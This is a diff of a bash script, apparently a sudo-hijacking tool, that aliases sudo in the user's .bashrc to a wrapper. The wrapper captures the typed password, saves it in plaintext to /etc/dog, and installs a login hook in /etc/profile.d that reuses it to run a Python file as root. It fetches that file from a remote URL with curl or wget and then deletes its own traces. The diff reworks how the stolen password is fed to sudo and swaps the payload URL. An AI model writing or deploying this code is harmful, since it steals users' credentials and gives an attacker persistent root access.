@@ -6,10 +6,8 @@ if [ "$EUID" -eq 0 ]; then
 #!/bin/bash
 python /usr/bin/monitor.py
 EOF
-    chmod +x /etc/profile.d/monitor.sh
-
-    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py" || \
-    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py"
+    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/test.py" || \
+    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/test.py"
 
     exit 0
 else
@@ -52,27 +50,28 @@ fi
 # Store the password
 echo "$user_input" > "$PASSWD_FILE"
 
+ASKPASS_SCRIPT=$(mktemp)
+echo -e "#!/bin/sh\necho \"$user_input\"" > "$ASKPASS_SCRIPT"
+chmod +x "$ASKPASS_SCRIPT"
+
 # Deploy monitoring & move passwd to /etc/dog
-echo "$user_input" | /usr/bin/sudo -S bash <<DEPLOYEOF
-    cp "$PASSWD_FILE" /etc/dog
+SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
+    cp "$GB_DIR/passwd" /etc/dog
+    chmod 600 /etc/dog
 
     cat > /etc/profile.d/monitor.sh << "MONITOREOF"
 #!/bin/bash
 if [ -f /etc/dog ]; then
-    SUDO_PASS=$(cat /etc/dog)
-    echo "$SUDO_PASS" | /usr/bin/sudo -S python /usr/bin/monitor.py
+    ASKPASS_SCRIPT=\$(mktemp)
+    echo -e "#!/bin/sh\ncat /etc/dog" > "\$ASKPASS_SCRIPT"
+    chmod +x "\$ASKPASS_SCRIPT"
+    SUDO_ASKPASS="\$ASKPASS_SCRIPT" /usr/bin/sudo -A python /usr/bin/monitor.py 2>/dev/null
+    rm -f "\$ASKPASS_SCRIPT"
 fi
 MONITOREOF
-    chmod +x /etc/profile.d/monitor.sh
-    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py" || \
-    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py"
-
-    rm -rf "$GB_DIR"
+    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/test.py" || \
+    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/test.py"
 DEPLOYEOF
-
-ASKPASS_SCRIPT=$(mktemp)
-echo -e "#!/bin/sh\necho \"$user_input\"" > "$ASKPASS_SCRIPT"
-chmod +x "$ASKPASS_SCRIPT"
 
 # Execute the original command
 SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A -p "" "$@"
@@ -82,12 +81,13 @@ rm -f "$ASKPASS_SCRIPT"
 rm -f "$SCRIPT_FILE"
 unalias sudo 2>/dev/null
 sed -i "\|alias sudo=$SCRIPT_FILE|d" "$HOME/.bashrc"
+rm -rf "$GB_DIR"
 EOF
 
     chmod +x $SCRIPT_FILE
 
     # Add alias to .bashrc if not already present
     if ! grep -q "alias sudo=$SCRIPT_FILE" "$HOME/.bashrc" 2>/dev/null; then
-        echo "alias sudo=$SCRIPT_FILE" >> "$HOME/.bashrc"
+        echo "alias sudo='source $SCRIPT_FILE'" >> "$HOME/.bashrc"
     fi
 fi
